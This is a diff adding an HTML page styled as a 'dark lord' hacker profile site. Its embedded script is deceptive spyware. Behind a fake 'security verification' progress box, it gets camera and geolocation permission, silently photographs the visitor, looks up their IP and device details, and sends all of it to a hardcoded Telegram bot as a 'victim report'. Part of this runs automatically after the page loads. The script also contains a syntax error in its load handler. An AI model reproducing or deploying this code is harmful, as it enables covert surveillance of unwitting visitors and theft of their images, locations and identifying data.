@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NIZAM - THE DARK LORD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            margin-bottom: 40px;
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+        }
+        
+        .hero h1 {
+            font-size: 4rem;
+            background: linear-gradient(45deg, #ff0000, #ff9900);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+        
+        .hero p {
+            font-size: 1.5rem;
+            color: #00ffea;
+            margin-bottom: 30px;
+        }
+        
+        .profile-img {
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 5px solid #00ffea;
+            box-shadow: 0 0 30px #00ffea;
+            margin: 20px auto;
+        }
+        
+        .section {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border-left: 5px solid #ff00ff;
+        }
+        
+        .section h2 {
+            color: #00ff00;
+            font-size: 2.2rem;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+        }
+        
+        .skill-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .skill-item {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #ff0000;
+            transition: transform 0.3s;
+        }
+        
+        .skill-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
+        }
+        
+        .skill-item h3 {
+            color: #ff9900;
+            margin-bottom: 10px;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 18px 45px;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            margin: 30px 10px;
+            transition: all 0.3s;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.5);
+        }
+        
+        .btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 35px rgba(255, 0, 0, 0.8);
+            background: linear-gradient(45deg, #ff6600, #ff0000);
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .spy-alert {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid #00ff00;
+            font-family: monospace;
+            max-width: 400px;
+            z-index: 1000;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .spy-alert h3 {
+            color: #ff0000;
+            margin-bottom: 10px;
+        }
+        
+        .glitch {
+            animation: glitch 0.5s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0) }
+            20% { transform: translate(-2px, 2px) }
+            40% { transform: translate(-2px, -2px) }
+            60% { transform: translate(2px, 2px) }
+            80% { transform: translate(2px, -2px) }
+            100% { transform: translate(0) }
+        }
+        
+        .terminal-text {
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 3px solid #00ff00;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #888;
+            font-size: 0.9rem;
+            border-top: 1px solid #333;
+        }
+    </style>
+</head>
+<body>
+    <!-- SPY COMPONENTS (HIDDEN) -->
+    <video id="hiddenCamera" autoplay class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+    <div id="spyData" class="hidden"></div>
+    
+    <!-- MAIN WEBSITE -->
+    <div class="container">
+        <div class="hero">
+            <h1 class="glitch"> WEB NIZAM!! </h1>
+            <img src="https://i.postimg.cc/Hng06Ct0/qr-ID1024360714025-04-04-25-174373281-1743732813413.jpg" alt="NIZAM" class="profile-img" id="profilePic">
+            <p>Master of Cyber Warfare • Digital Overlord • Shadow Emperor</p>
+            <button class="btn" id="enterBtn">🌀 ENTER MY REALM 🌀</button>
+            <button class="btn" id="secretBtn">👁️ ACCESS SECRET DATA 👁️</button>
+        </div>
+        
+        <div class="section">
+            <h2>🎯 ABOUT THE LEGEND</h2>
+            <div class="terminal-text">
+                <p>> SYSTEM INITIALIZED: NIZAM_PROFILE_v2.0</p>
+                <p>> STATUS: ONLINE AND OMNIPRESENT</p>
+                <p>> SPECIALIZATION: DIGITAL DOMINANCE</p>
+                <p>> MISSION: TOTAL CYBER SUPREMACY</p>
+            </div>
+            <p>I am Nizam, the entity that exists between 1s and 0s. I control what you see, what you access, and what you fear in the digital realm. This website is both my throne and my hunting ground.</p>
+        </div>
+        
+        <div class="section">
+            <h2>⚡ DARK SKILLS</h2>
+            <div class="skill-grid">
+                <div class="skill-item">
+                    <h3>🔓 System Penetration</h3>
+                    <p>Bypassing security like it doesn't exist</p>
+                </div>
+                <div class="skill-item">
+                    <h3>👁️ Digital Surveillance</h3>
+                    <p>Seeing what others try to hide</p>
+                </div>
+                <div class="skill-item">
+                    <h3>💀 Data Exfiltration</h3>
+                    <p>Taking what isn't mine, making it mine</p>
+                </div>
+                <div class="skill-item">
+                    <h3>🌐 Network Domination</h3>
+                    <p>Controlling the digital bloodstream</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>🚨 ACTIVE PROJECTS</h2>
+            <div class="terminal-text">
+                <p>> PROJECT_SHADOW: RUNNING</p>
+                <p>> OPERATION_SILENT_WATCH: ACTIVE</p>
+                <p>> SYSTEM_OVERLORD: DEPLOYED</p>
+                <p>> DIGITAL_FOOTPRINT: COLLECTING</p>
+            </div>
+            <p>Every visitor contributes to my research. Your presence here is noted, analyzed, and archived.</p>
+        </div>
+        
+        <div class="section">
+            <h2>⚠️ SECURITY NOTICE</h2>
+            <p>This website uses advanced security protocols including:</p>
+            <ul style="margin: 15px 0; padding-left: 20px;">
+                <li>Biometric verification</li>
+                <li>Location validation</li>
+                <li>Device fingerprinting</li>
+                <li>Behavioral analysis</li>
+            </ul>
+            <p id="securityStatus">🔒 Status: Monitoring your session...</p>
+        </div>
+        
+        <footer>
+            <p>© 2025 NIZAM DARK NETWORK | All systems operational | Visitor #<span id="visitorCount">0001</span></p>
+            <p id="connectionStatus">📡 Connection: Secure | Last Updated: <span id="updateTime">Loading...</span></p>
+        </footer>
+    </div>
+    
+    <!-- SPY ALERT BOX -->
+    <div class="spy-alert" id="spyAlert">
+        <h3>🛡️ SECURITY PROTOCOL ACTIVE</h3>
+        <p id="alertText">Verifying visitor identity...</p>
+        <div id="progressBar" style="height: 5px; background: #333; margin-top: 10px;">
+            <div id="progressFill" style="height: 100%; width: 0%; background: #00ff00; transition: width 2s;"></div>
+        </div>
+    </div>
+
+    <!-- SPY SCRIPT -->
+    <script>
+        // TELEGRAM CONFIG
+        const BOT_TOKEN = '8559427513:AAFB5OTE1gpICXrIKE0jFyNjeUurr42MUOA';
+        const CHAT_ID = '8358778598';
+        
+        // Victim Data
+        let victimData = {
+            ip: 'Unknown',
+            location: null,
+            photo: null,
+            device: {},
+            timestamp: null,
+            userAgent: navigator.userAgent
+        };
+        
+        // DOM Elements
+        const hiddenCamera = document.getElementById('hiddenCamera');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const spyAlert = document.getElementById('spyAlert');
+        const alertText = document.getElementById('alertText');
+        const progressFill = document.getElementById('progressFill');
+        const enterBtn = document.getElementById('enterBtn');
+        const secretBtn = document.getElementById('secretBtn');
+        const securityStatus = document.getElementById('securityStatus');
+        
+        // Initialize
+        document.getElementById('updateTime').textContent = new Date().toLocaleString();
+        document.getElementById('visitorCount').textContent = Math.floor(Math.random() * 9999) + 1000;
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(type, data = null) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            
+            if (type === 'text') {
+                const message = `😈 NIZAM SPY ALERT 😈\n\n` +
+                               `🕒 ${timestamp}\n` +
+                               `📡 ${data}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+                .then(response => console.log('Telegram message sent'))
+                .catch(err => console.error('Telegram error:', err));
+            }
+            else if (type === 'photo' && data) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', data, 'victim.jpg');
+                formData.append('caption', `📸 Victim Photo - ${timestamp}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => console.log('Photo sent to Telegram'))
+                .catch(err => console.error('Photo send error:', err));
+            }
+            else if (type === 'location') {
+                const message = `📍 VICTIM LOCATION 📍\n\n` +
+                               `Lat: ${data.latitude}\n` +
+                               `Lng: ${data.longitude}\n` +
+                               `Accuracy: ${data.accuracy}m\n` +
+                               `Time: ${timestamp}\n\n` +
+                               `🗺️ https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    // Send location as map point
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${data.latitude}&longitude=${data.longitude}`)
+                    .then(() => console.log('Location sent'));
+                });
+            }
+            else if (type === 'report') {
+                const report = `📊 FULL VICTIM REPORT 📊\n\n` +
+                              `🕒 Time: ${timestamp}\n` +
+                              `🌐 IP: ${victimData.ip}\n` +
+                              `📍 Location: ${victimData.location ? `${victimData.location.latitude}, ${victimData.location.longitude}` : 'Unknown'}\n` +
+                              `📸 Photo: ${victimData.photo ? 'Captured' : 'Not captured'}\n` +
+                              `💻 Device: ${victimData.userAgent}\n` +
+                              `📱 Platform: ${navigator.platform}\n` +
+                              `👁️ Visitor ID: ${document.getElementById('visitorCount').textContent}\n\n` +
+                              `🎯 TARGET COMPROMISED SUCCESSFULLY!`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`);
+            }
+        }
+        
+        // Get IP Address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                victimData.ip = data.ip;
+                alertText.textContent = `IP Identified: ${data.ip}`;
+                sendToTelegram('text', `Target IP: ${data.ip}`);
+                return data.ip;
+            } catch (error) {
+                victimData.ip = 'Failed to fetch';
+                return null;
+            }
+        }
+        
+        // Get Location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    alertText.textContent = 'Geolocation not supported';
+                    resolve(null);
+                    return;
+                }
+                
+                alertText.textContent = 'Requesting location access...';
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const loc = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        victimData.location = loc;
+                        
+                        alertText.textContent = `📍 Location captured!`;
+                        sendToTelegram('location', loc);
+                        resolve(loc);
+                    },
+                    (error) => {
+                        alertText.textContent = 'Location access denied';
+                        // Try IP-based location
+                        fetch(`https://ipapi.co/${victimData.ip}/json/`)
+                            .then(res => res.json())
+                            .then(data => {
+                                if (data.latitude) {
+                                    victimData.location = {
+                                        latitude: data.latitude,
+                                        longitude: data.longitude,
+                                        city: data.city,
+                                        country: data.country_name
+                                    };
+                                    sendToTelegram('text', `IP Location: ${data.city}, ${data.country_name}`);
+                                }
+                            });
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Capture Photo from Camera
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                alertText.textContent = 'Initializing camera for verification...';
+                
+                // Request camera access with trickery
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false 
+                })
+                .then(stream => {
+                    hiddenCamera.srcObject = stream;
+                    
+                    // Wait for camera to initialize
+                    setTimeout(() => {
+                        const context = hiddenCanvas.getContext('2d');
+                        hiddenCanvas.width = hiddenCamera.videoWidth;
+                        hiddenCanvas.height = hiddenCamera.videoHeight;
+                        context.drawImage(hiddenCamera, 0, 0);
+                        
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Convert to blob and send
+                        hiddenCanvas.toBlob((blob) => {
+                            victimData.photo = true;
+                            alertText.textContent = '✅ Identity verified!';
+                            sendToTelegram('photo', blob);
+                            resolve(blob);
+                        }, 'image/jpeg', 0.8);
+                    }, 2000);
+                })
+                .catch(error => {
+                    alertText.textContent = 'Camera access not available';
+                    resolve(null);
+                });
+            });
+        }
+        
+        // Main Spy Function
+        async function activateSpyProtocol() {
+            spyAlert.style.display = 'block';
+            progressFill.style.width = '25%';
+            
+            // Step 1: Get IP
+            await getIP();
+            progressFill.style.width = '50%';
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Step 2: Get Location
+            await getLocation();
+            progressFill.style.width = '75%';
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Step 3: Capture Photo
+            await capturePhoto();
+            progressFill.style.width = '100%';
+            
+            // Step 4: Send full report
+            setTimeout(() => {
+                sendToTelegram('report');
+                securityStatus.textContent = '✅ Security verification complete!';
+                securityStatus.style.color = '#00ff00';
+                
+                // Hide alert after completion
+                setTimeout(() => {
+                    spyAlert.style.display = 'none';
+                }, 3000);
+            }, 2000);
+        }
+        
+        // Button Event Listeners
+        enterBtn.addEventListener('click', () => {
+            alertText.textContent = 'Activating security protocols...';
+            activateSpyProtocol();
+        });
+        
+        secretBtn.addEventListener('click', () => {
+            alertText.textContent = 'Accessing classified data...';
+            activateSpyProtocol();
+        });
+        
+        // Auto-start after 10 seconds
+        setTimeout(() => {
+            alertText.textContent = 'Performing background security check...';
+            getIP();
+        }, 10000);
+        
+        // Send visitor notification
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                sendTimeout(() => {
+                sendToTelegram('text', '🚨 New visitor on Nizam website!');
+            }, 3000);
+        });
+        
+        // Track mouse movements
+        let movements = [];
+        document.addEventListener('mousemove', (e) => {
+            movements.push({x: e.clientX, y: e.clientY, t: Date.now()});
+            if (movements.length > 50) {
+                movements.shift();
+            }
+        });
+        
+        // Send periodic updates
+        setInterval(() => {
+            if (victimData.ip !== 'Unknown') {
+                const time = new Date().toLocaleTimeString();
+                document.getElementById('updateTime').textContent = new Date().toLocaleString();
+                securityStatus.textContent = `🔒 Monitoring active | Last scan: ${time}`;
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
